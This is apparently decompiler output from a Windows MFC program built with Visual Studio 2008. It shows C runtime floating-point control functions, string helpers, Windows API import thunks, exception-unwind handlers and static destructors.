// Library: Visual Studio 2008 Release

uint __hw_cw(void)

{
  uint uVar1;
  uint uVar2;
  uint unaff_EBX;
  
  uVar1 = (uint)((unaff_EBX & 0x10) != 0);
  if ((unaff_EBX & 8) != 0) {
    uVar1 = uVar1 | 4;
  }
  if ((unaff_EBX & 4) != 0) {
    uVar1 = uVar1 | 8;
  }
  if ((unaff_EBX & 2) != 0) {
    uVar1 = uVar1 | 0x10;
  }
  if ((unaff_EBX & 1) != 0) {
    uVar1 = uVar1 | 0x20;
  }
  if ((unaff_EBX & 0x80000) != 0) {
    uVar1 = uVar1 | 2;
  }
  uVar2 = unaff_EBX & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x400;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x800;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0xc00;
    }
  }
  if ((unaff_EBX & 0x30000) == 0) {
    uVar1 = uVar1 | 0x300;
  }
  else if ((unaff_EBX & 0x30000) == 0x10000) {
    uVar1 = uVar1 | 0x200;
  }
  if ((unaff_EBX & 0x40000) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___hw_cw_sse2
// 
// Library: Visual Studio 2008 Release

uint __fastcall ___hw_cw_sse2(undefined4 param_1,uint param_2)

{
  uint uVar1;
  uint uVar2;
  
  uVar1 = 0;
  if ((param_2 & 0x10) != 0) {
    uVar1 = 0x80;
  }
  if ((param_2 & 8) != 0) {
    uVar1 = uVar1 | 0x200;
  }
  if ((param_2 & 4) != 0) {
    uVar1 = uVar1 | 0x400;
  }
  if ((param_2 & 2) != 0) {
    uVar1 = uVar1 | 0x800;
  }
  if ((param_2 & 1) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  if ((param_2 & 0x80000) != 0) {
    uVar1 = uVar1 | 0x100;
  }
  uVar2 = param_2 & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x2000;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x4000;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0x6000;
    }
  }
  uVar2 = param_2 & 0x3000000;
  if (uVar2 == 0x1000000) {
    uVar1 = uVar1 | 0x8040;
  }
  else {
    if (uVar2 == 0x2000000) {
      return uVar1 | 0x40;
    }
    if (uVar2 == 0x3000000) {
      return uVar1 | 0x8000;
    }
  }
  return uVar1;
}



// Library Function - Single Match
//  __control87
// 
// Library: Visual Studio 2008 Release

uint __cdecl __control87(uint _NewValue,uint _Mask)

{
  ushort uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  ushort in_FPUControlWord;
  
  uVar5 = 0;
  if ((in_FPUControlWord & 1) != 0) {
    uVar5 = 0x10;
  }
  if ((in_FPUControlWord & 4) != 0) {
    uVar5 = uVar5 | 8;
  }
  if ((in_FPUControlWord & 8) != 0) {
    uVar5 = uVar5 | 4;
  }
  if ((in_FPUControlWord & 0x10) != 0) {
    uVar5 = uVar5 | 2;
  }
  if ((in_FPUControlWord & 0x20) != 0) {
    uVar5 = uVar5 | 1;
  }
  if ((in_FPUControlWord & 2) != 0) {
    uVar5 = uVar5 | 0x80000;
  }
  uVar1 = in_FPUControlWord & 0xc00;
  if ((in_FPUControlWord & 0xc00) != 0) {
    if (uVar1 == 0x400) {
      uVar5 = uVar5 | 0x100;
    }
    else if (uVar1 == 0x800) {
      uVar5 = uVar5 | 0x200;
    }
    else if (uVar1 == 0xc00) {
      uVar5 = uVar5 | 0x300;
    }
  }
  if ((in_FPUControlWord & 0x300) == 0) {
    uVar5 = uVar5 | 0x20000;
  }
  else if ((in_FPUControlWord & 0x300) == 0x200) {
    uVar5 = uVar5 | 0x10000;
  }
  if ((in_FPUControlWord & 0x1000) != 0) {
    uVar5 = uVar5 | 0x40000;
  }
  uVar2 = ~_Mask & uVar5 | _NewValue & _Mask;
  if (uVar2 != uVar5) {
    uVar5 = __hw_cw();
    uVar2 = 0;
    if ((uVar5 & 1) != 0) {
      uVar2 = 0x10;
    }
    if ((uVar5 & 4) != 0) {
      uVar2 = uVar2 | 8;
    }
    if ((uVar5 & 8) != 0) {
      uVar2 = uVar2 | 4;
    }
    if ((uVar5 & 0x10) != 0) {
      uVar2 = uVar2 | 2;
    }
    if ((uVar5 & 0x20) != 0) {
      uVar2 = uVar2 | 1;
    }
    if ((uVar5 & 2) != 0) {
      uVar2 = uVar2 | 0x80000;
    }
    uVar3 = uVar5 & 0xc00;
    if (uVar3 != 0) {
      if (uVar3 == 0x400) {
        uVar2 = uVar2 | 0x100;
      }
      else if (uVar3 == 0x800) {
        uVar2 = uVar2 | 0x200;
      }
      else if (uVar3 == 0xc00) {
        uVar2 = uVar2 | 0x300;
      }
    }
    if ((uVar5 & 0x300) == 0) {
      uVar2 = uVar2 | 0x20000;
    }
    else if ((uVar5 & 0x300) == 0x200) {
      uVar2 = uVar2 | 0x10000;
    }
    if ((uVar5 & 0x1000) != 0) {
      uVar2 = uVar2 | 0x40000;
    }
  }
  uVar5 = 0;
  if (DAT_00438ea4 != 0) {
    if ((char)MXCSR < '\0') {
      uVar5 = 0x10;
    }
    if ((MXCSR & 0x200) != 0) {
      uVar5 = uVar5 | 8;
    }
    if ((MXCSR & 0x400) != 0) {
      uVar5 = uVar5 | 4;
    }
    if ((MXCSR & 0x800) != 0) {
      uVar5 = uVar5 | 2;
    }
    if ((MXCSR & 0x1000) != 0) {
      uVar5 = uVar5 | 1;
    }
    if ((MXCSR & 0x100) != 0) {
      uVar5 = uVar5 | 0x80000;
    }
    uVar3 = MXCSR & 0x6000;
    if (uVar3 != 0) {
      if (uVar3 == 0x2000) {
        uVar5 = uVar5 | 0x100;
      }
      else if (uVar3 == 0x4000) {
        uVar5 = uVar5 | 0x200;
      }
      else if (uVar3 == 0x6000) {
        uVar5 = uVar5 | 0x300;
      }
    }
    uVar4 = MXCSR & 0x8040;
    if (uVar4 == 0x40) {
      uVar5 = uVar5 | 0x2000000;
    }
    else if (uVar4 == 0x8000) {
      uVar5 = uVar5 | 0x3000000;
    }
    else if (uVar4 == 0x8040) {
      uVar5 = uVar5 | 0x1000000;
    }
    uVar4 = ~(_Mask & 0x308031f) & uVar5 | _Mask & 0x308031f & _NewValue;
    if (uVar4 != uVar5) {
      uVar5 = ___hw_cw_sse2(uVar3,uVar4);
      ___set_fpsr_sse2(uVar5);
      uVar5 = 0;
      if ((char)MXCSR < '\0') {
        uVar5 = 0x10;
      }
      if ((MXCSR & 0x200) != 0) {
        uVar5 = uVar5 | 8;
      }
      if ((MXCSR & 0x400) != 0) {
        uVar5 = uVar5 | 4;
      }
      if ((MXCSR & 0x800) != 0) {
        uVar5 = uVar5 | 2;
      }
      if ((MXCSR & 0x1000) != 0) {
        uVar5 = uVar5 | 1;
      }
      if ((MXCSR & 0x100) != 0) {
        uVar5 = uVar5 | 0x80000;
      }
      uVar3 = MXCSR & 0x6000;
      if (uVar3 != 0) {
        if (uVar3 == 0x2000) {
          uVar5 = uVar5 | 0x100;
        }
        else if (uVar3 == 0x4000) {
          uVar5 = uVar5 | 0x200;
        }
        else if (uVar3 == 0x6000) {
          uVar5 = uVar5 | 0x300;
        }
      }
      uVar3 = MXCSR & 0x8040;
      if (uVar3 == 0x40) {
        uVar5 = uVar5 | 0x2000000;
      }
      else if (uVar3 == 0x8000) {
        uVar5 = uVar5 | 0x3000000;
      }
      else if (uVar3 == 0x8040) {
        uVar5 = uVar5 | 0x1000000;
      }
    }
    uVar3 = uVar5 ^ uVar2;
    uVar2 = uVar5 | uVar2;
    if ((uVar3 & 0x8031f) != 0) {
      uVar2 = uVar2 | 0x80000000;
    }
  }
  return uVar2;
}



// Library Function - Single Match
//  ___crtLCMapStringW
// 
// Library: Visual Studio 2008 Release

int __cdecl
___crtLCMapStringW(LPCWSTR _LocaleName,DWORD _DWMapFlag,LPCWSTR _LpSrcStr,int _CchSrc,
                  LPWSTR _LpDestStr,int _CchDest)

{
  int iVar1;
  short *psVar2;
  LPWSTR pWVar3;
  int in_stack_0000001c;
  _LocaleUpdate local_14 [8];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_14,(localeinfo_struct *)_LocaleName);
  psVar2 = (short *)_CchSrc;
  pWVar3 = _LpDestStr;
  if (0 < (int)_LpDestStr) {
    do {
      pWVar3 = (LPWSTR)((int)pWVar3 + -1);
      if (*psVar2 == 0) goto LAB_00427c98;
      psVar2 = psVar2 + 1;
    } while (pWVar3 != (LPWSTR)0x0);
    pWVar3 = (LPWSTR)0xffffffff;
LAB_00427c98:
    _LpDestStr = (LPWSTR)((int)_LpDestStr + (-1 - (int)pWVar3));
  }
  iVar1 = LCMapStringW(_DWMapFlag,(DWORD)_LpSrcStr,(LPCWSTR)_CchSrc,(int)_LpDestStr,(LPWSTR)_CchDest
                       ,in_stack_0000001c);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  ___ascii_strnicmp
// 
// Library: Visual Studio

int __cdecl ___ascii_strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  char cVar1;
  byte bVar2;
  ushort uVar3;
  uint uVar4;
  bool bVar5;
  
  if (_MaxCount != 0) {
    do {
      bVar2 = *_Str1;
      cVar1 = *_Str2;
      uVar3 = CONCAT11(bVar2,cVar1);
      if (bVar2 == 0) break;
      uVar3 = CONCAT11(bVar2,cVar1);
      uVar4 = (uint)uVar3;
      if (cVar1 == '\0') break;
      _Str1 = (char *)((byte *)_Str1 + 1);
      _Str2 = _Str2 + 1;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar4 = (uint)CONCAT11(bVar2 + 0x20,cVar1);
      }
      uVar3 = (ushort)uVar4;
      bVar2 = (byte)uVar4;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar3 = (ushort)CONCAT31((int3)(uVar4 >> 8),bVar2 + 0x20);
      }
      bVar2 = (byte)(uVar3 >> 8);
      bVar5 = bVar2 < (byte)uVar3;
      if (bVar2 != (byte)uVar3) goto LAB_00427d11;
      _MaxCount = _MaxCount - 1;
    } while (_MaxCount != 0);
    _MaxCount = 0;
    bVar2 = (byte)(uVar3 >> 8);
    bVar5 = bVar2 < (byte)uVar3;
    if (bVar2 != (byte)uVar3) {
LAB_00427d11:
      _MaxCount = 0xffffffff;
      if (!bVar5) {
        _MaxCount = 1;
      }
    }
  }
  return _MaxCount;
}



// Library Function - Single Match
//  ___mtold12
// 
// Library: Visual Studio 2008 Release

void __cdecl ___mtold12(char *param_1,int param_2,uint *param_3)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  bool bVar4;
  bool bVar5;
  short sVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  
  uVar7 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  sVar6 = 0x404e;
  *param_3 = 0;
  param_3[1] = 0;
  param_3[2] = 0;
  if (param_2 != 0) {
    do {
      uVar2 = *param_3;
      uVar10 = *param_3;
      uVar1 = param_3[1];
      uVar11 = param_3[2];
      uVar9 = param_3[1] * 2;
      bVar4 = false;
      uVar8 = (param_3[2] * 2 | param_3[1] >> 0x1f) * 2 | uVar9 >> 0x1f;
      uVar3 = uVar2 * 4;
      uVar9 = (uVar9 | uVar2 >> 0x1f) * 2 | uVar2 * 2 >> 0x1f;
      uVar2 = uVar3 + uVar10;
      *param_3 = uVar3;
      param_3[1] = uVar9;
      param_3[2] = uVar8;
      if ((uVar2 < uVar3) || (uVar2 < uVar10)) {
        bVar4 = true;
      }
      bVar5 = false;
      *param_3 = uVar2;
      if (bVar4) {
        uVar10 = uVar9 + 1;
        if ((uVar10 < uVar9) || (uVar10 == 0)) {
          bVar5 = true;
        }
        param_3[1] = uVar10;
        if (bVar5) {
          param_3[2] = uVar8 + 1;
        }
      }
      uVar10 = param_3[1] + uVar1;
      bVar4 = false;
      if ((uVar10 < param_3[1]) || (uVar10 < uVar1)) {
        bVar4 = true;
      }
      param_3[1] = uVar10;
      if (bVar4) {
        param_3[2] = param_3[2] + 1;
      }
      param_3[2] = param_3[2] + uVar11;
      bVar4 = false;
      uVar1 = uVar2 * 2;
      uVar11 = uVar10 * 2 | uVar2 >> 0x1f;
      uVar10 = param_3[2] * 2 | uVar10 >> 0x1f;
      *param_3 = uVar1;
      param_3[1] = uVar11;
      param_3[2] = uVar10;
      uVar2 = uVar1 + (int)*param_1;
      if ((uVar2 < uVar1) || (uVar2 < (uint)(int)*param_1)) {
        bVar4 = true;
      }
      *param_3 = uVar2;
      if (bVar4) {
        uVar2 = uVar11 + 1;
        bVar4 = false;
        if ((uVar2 < uVar11) || (uVar2 == 0)) {
          bVar4 = true;
        }
        param_3[1] = uVar2;
        if (bVar4) {
          param_3[2] = uVar10 + 1;
        }
      }
      param_2 = param_2 + -1;
      param_1 = param_1 + 1;
    } while (param_2 != 0);
  }
  while (param_3[2] == 0) {
    param_3[2] = param_3[1] >> 0x10;
    sVar6 = sVar6 + -0x10;
    param_3[1] = param_3[1] << 0x10 | *param_3 >> 0x10;
    *param_3 = *param_3 << 0x10;
  }
  uVar2 = param_3[2];
  while ((uVar2 & 0x8000) == 0) {
    uVar10 = *param_3;
    uVar1 = param_3[1];
    sVar6 = sVar6 + -1;
    *param_3 = uVar10 * 2;
    uVar2 = param_3[2] * 2;
    param_3[1] = uVar1 * 2 | uVar10 >> 0x1f;
    param_3[2] = uVar2 | uVar1 >> 0x1f;
  }
  *(short *)((int)param_3 + 10) = sVar6;
  ___security_check_cookie_4(uVar7 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___set_fpsr_sse2
// 
// Library: Visual Studio 2008 Release

void __cdecl ___set_fpsr_sse2(uint param_1)

{
  if (DAT_00438ea4 != 0) {
    if (((param_1 & 0x40) == 0) || (DAT_00433f94 == 0)) {
      MXCSR = param_1 & 0xffffffbf;
    }
    else {
      MXCSR = param_1;
    }
  }
  return;
}



void GetAdaptersInfo(void)

{
                    // WARNING: Could not recover jumptable at 0x0042803e. Too many branches
                    // WARNING: Treating indirect jump as call
  GetAdaptersInfo();
  return;
}



void __fastcall FUN_00428044(void **param_1)

{
  if (*param_1 != (void *)0x0) {
    _free(*param_1);
    *param_1 = (void *)0x0;
  }
  param_1[1] = (void *)0x0;
  param_1[2] = (void *)0x0;
  return;
}



void * __fastcall FUN_00428063(void *param_1)

{
  _memset(param_1,0,0x18);
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 __fastcall FUN_00428079(LPCRITICAL_SECTION param_1)

{
  InitializeCriticalSection(param_1);
  return 0;
}



int __fastcall FUN_004280c4(int param_1)

{
  FUN_00428063((void *)(param_1 + 0x14));
  *(undefined4 *)(param_1 + 0x2c) = 0;
  *(undefined4 *)(param_1 + 0x30) = 0;
  *(undefined4 *)(param_1 + 0x34) = 0;
  return param_1;
}



void __fastcall FUN_004280e0(int param_1)

{
  DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x14));
  FUN_00428044((void **)(param_1 + 0x2c));
  return;
}



undefined4 * __fastcall FUN_004280f8(undefined4 *param_1)

{
  int iVar1;
  
  FUN_004280c4((int)param_1);
  *param_1 = 0x38;
  param_1[2] = 0x400000;
  param_1[1] = 0x400000;
  param_1[3] = 0x900;
  param_1[4] = &DAT_0042c740;
  iVar1 = FUN_00428079((LPCRITICAL_SECTION)(param_1 + 5));
  if (iVar1 < 0) {
    DAT_00437d44 = 1;
  }
  return param_1;
}



HRESULT CreateStdAccessibleObject(HWND hwnd,LONG idObject,IID *riid,void **ppvObject)

{
  HRESULT HVar1;
  
                    // WARNING: Could not recover jumptable at 0x00428138. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = CreateStdAccessibleObject(hwnd,idObject,riid,ppvObject);
  return HVar1;
}



LRESULT LresultFromObject(IID *riid,WPARAM wParam,LPUNKNOWN punk)

{
  LRESULT LVar1;
  
                    // WARNING: Could not recover jumptable at 0x0042813e. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = LresultFromObject(riid,wParam,punk);
  return LVar1;
}



void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x00428144. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}



BOOL ClosePrinter(HANDLE hPrinter)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0042814a. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = ClosePrinter(hPrinter);
  return BVar1;
}



LONG DocumentPropertiesW(HWND hWnd,HANDLE hPrinter,LPWSTR pDeviceName,PDEVMODEW pDevModeOutput,
                        PDEVMODEW pDevModeInput,DWORD fMode)

{
  LONG LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00428150. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = DocumentPropertiesW(hWnd,hPrinter,pDeviceName,pDevModeOutput,pDevModeInput,fMode);
  return LVar1;
}



BOOL OpenPrinterW(LPWSTR pPrinterName,LPHANDLE phPrinter,LPPRINTER_DEFAULTSW pDefault)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00428156. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = OpenPrinterW(pPrinterName,phPrinter,pDefault);
  return BVar1;
}



void Unwind_004281b1(void)

{
  FUN_0040a744();
  return;
}



void Unwind_004281dc(void)

{
  int unaff_EBP;
  
  FUN_0040b2a1((int *)(*(int *)(unaff_EBP + -0x10) + 0x34));
  return;
}



void Unwind_004281e7(void)

{
  int unaff_EBP;
  
  FUN_0040ad23((int *)(*(int *)(unaff_EBP + -0x10) + 0x74));
  return;
}



void Unwind_0042820d(void)

{
  int unaff_EBP;
  
  FUN_0040b2a1(*(int **)(unaff_EBP + -0x10));
  return;
}



void Unwind_00428230(void)

{
  int unaff_EBP;
  
  FUN_0040b2a1((int *)(unaff_EBP + -0x10));
  return;
}



void Unwind_00428253(void)

{
  int unaff_EBP;
  
  FUN_0040b2a1((int *)(*(int *)(unaff_EBP + -0x14) + 0x34));
  return;
}



void Unwind_0042825e(void)

{
  int unaff_EBP;
  
  FUN_0040ad23((int *)(*(int *)(unaff_EBP + -0x14) + 0x74));
  return;
}



void Unwind_00428269(void)

{
  int unaff_EBP;
  
  CNoTrackObject::operator_delete(*(void **)(unaff_EBP + 8));
  return;
}



void Unwind_00428272(void)

{
  int unaff_EBP;
  
  CNoTrackObject::operator_delete(*(void **)(unaff_EBP + 8));
  return;
}



void Unwind_0042827b(void)

{
  int unaff_EBP;
  
  CNoTrackObject::operator_delete(*(void **)(unaff_EBP + 8));
  return;
}



void Unwind_0042829f(void)

{
  int unaff_EBP;
  
  CNoTrackObject::operator_delete(*(void **)(unaff_EBP + -0x10));
  return;
}



void Unwind_004282c3(void)

{
  int unaff_EBP;
  
  FUN_0040a6dd(*(void **)(unaff_EBP + -0x10));
  return;
}



void Unwind_004282e7(void)

{
  int unaff_EBP;
  
  FUN_0040b2a1((int *)(unaff_EBP + -0x418));
  return;
}



void Unwind_0042831a(void)

{
  int unaff_EBP;
  
  FUN_0040b2a1((int *)(unaff_EBP + -0x14));
  return;
}



void Unwind_00428322(void)

{
  int unaff_EBP;
  
  FUN_0040b2a1((int *)(unaff_EBP + 0x10));
  return;
}



void Unwind_00428345(void)

{
  int unaff_EBP;
  
  FUN_0040b2a1((int *)(*(int *)(unaff_EBP + -0x10) + 0xc));
  return;
}



void Unwind_0042836b(void)

{
  int unaff_EBP;
  
  FUN_0040a6dd(*(void **)(unaff_EBP + -0x14));
  return;
}



void Unwind_0042838f(void)

{
  int unaff_EBP;
  
  FUN_00413030(*(int *)(unaff_EBP + -0x10) + 4);
  return;
}



void Unwind_0042839a(void)

{
  int unaff_EBP;
  
  FUN_0040c350((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x1c));
  return;
}



void Unwind_004283a5(void)

{
  int unaff_EBP;
  
  FUN_0040c350((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x38));
  return;
}



void Unwind_004283e6(void)

{
  int unaff_EBP;
  
  FUN_0040c6fc(unaff_EBP + -0x14);
  return;
}



void Unwind_00428409(void)

{
  int unaff_EBP;
  
  FUN_0040e5d1(*(void **)(unaff_EBP + -0x10));
  return;
}



void Unwind_0042844b(void)

{
  int unaff_EBP;
  
  CCmdTarget::~CCmdTarget(*(CCmdTarget **)(unaff_EBP + -0x10));
  return;
}



void Unwind_0042846e(void)

{
  int unaff_EBP;
  
  CWnd::~CWnd((CWnd *)(unaff_EBP + -0x60));
  return;
}



void Unwind_00428491(void)

{
  int unaff_EBP;
  
  FUN_0040a3fc(*(void **)(unaff_EBP + -0x1c));
  return;
}



void Unwind_004284d1(void)

{
  int unaff_EBP;
  
  FUN_0040c6fc(unaff_EBP + -0x224);
  return;
}



void Unwind_00428504(void)

{
  int unaff_EBP;
  
  FUN_0040fddd((int *)(unaff_EBP + -0x14));
  return;
}



void Unwind_0042850c(void)

{
  int unaff_EBP;
  
  CDC::~CDC((CDC *)(unaff_EBP + -0x28));
  return;
}



void Unwind_00428514(void)

{
  int unaff_EBP;
  
  CWnd::~CWnd((CWnd *)(unaff_EBP + -0x7c));
  return;
}



void Unwind_0042851c(void)

{
  int unaff_EBP;
  
  CDC::~CDC((CDC *)(unaff_EBP + -0x28));
  return;
}



void Unwind_0042853f(void)

{
  int unaff_EBP;
  
  FUN_0040f9c6((int **)(unaff_EBP + 0xc));
  return;
}



void Unwind_00428562(void)

{
  int unaff_EBP;
  
  FUN_0040b2a1((int *)(unaff_EBP + -0x418));
  return;
}



void Unwind_00428595(void)

{
  int unaff_EBP;
  
  CWaitCursor::~CWaitCursor((CWaitCursor *)(unaff_EBP + 0xb));
  return;
}



void Unwind_004285d3(void)

{
  int unaff_EBP;
  
  FUN_0040b2a1((int *)(unaff_EBP + -0x418));
  return;
}



void Unwind_00428606(void)

{
  int unaff_EBP;
  
  FUN_0040a3fc(*(void **)(unaff_EBP + 8));
  return;
}



void Unwind_0042862b(void)

{
  int unaff_EBP;
  
  FUN_0040a6dd(*(void **)(unaff_EBP + -0x20));
  return;
}



void Unwind_0042864f(void)

{
  int unaff_EBP;
  
  FUN_0040a6dd(*(void **)(unaff_EBP + -0x18));
  return;
}



void Unwind_00428658(void)

{
  int unaff_EBP;
  
  FUN_0040a6dd(*(void **)(unaff_EBP + -0x18));
  return;
}



void Unwind_004286c0(void)

{
  int unaff_EBP;
  
  FUN_0040a3fc(*(void **)(unaff_EBP + -0x10));
  return;
}



void FUN_004289ab(void)

{
  PTR_vftable_00432198 = (undefined *)CSimpleException::vftable;
  return;
}



void FUN_004289b6(void)

{
  PTR_vftable_004322b0 = (undefined *)CSimpleException::vftable;
  return;
}



void FUN_004289c1(void)

{
  PTR_vftable_004323c8 = (undefined *)CSimpleException::vftable;
  return;
}



void FUN_004289cc(void)

{
  CThreadLocalObject::~CThreadLocalObject((CThreadLocalObject *)&DAT_004342f0);
  return;
}



void FUN_004289d6(void)

{
  CProcessLocalObject::~CProcessLocalObject((CProcessLocalObject *)&DAT_004342ec);
  return;
}



void FUN_004289e0(void)

{
  FUN_0040c94a(0x434310);
  return;
}



void FUN_004289ea(void)

{
  CProcessLocalObject::~CProcessLocalObject((CProcessLocalObject *)&DAT_00435d00);
  return;
}



void FUN_004289f4(void)

{
  CWnd::~CWnd((CWnd *)&DAT_00435ba0);
  return;
}



void FUN_004289fe(void)

{
  CWnd::~CWnd((CWnd *)&DAT_00435bf8);
  return;
}



void FUN_00428a08(void)

{
  CWnd::~CWnd((CWnd *)&DAT_00435c50);
  return;
}



void FUN_00428a12(void)

{
  CWnd::~CWnd((CWnd *)&DAT_00435ca8);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00428a1c(void)

{
  _DAT_00435d08 = CSimpleException::vftable;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00428a27(void)

{
  _DAT_00435e20 = CSimpleException::vftable;
  return;
}



void FUN_00428a32(void)

{
  FUN_004280e0(0x436b2c);
  return;
}


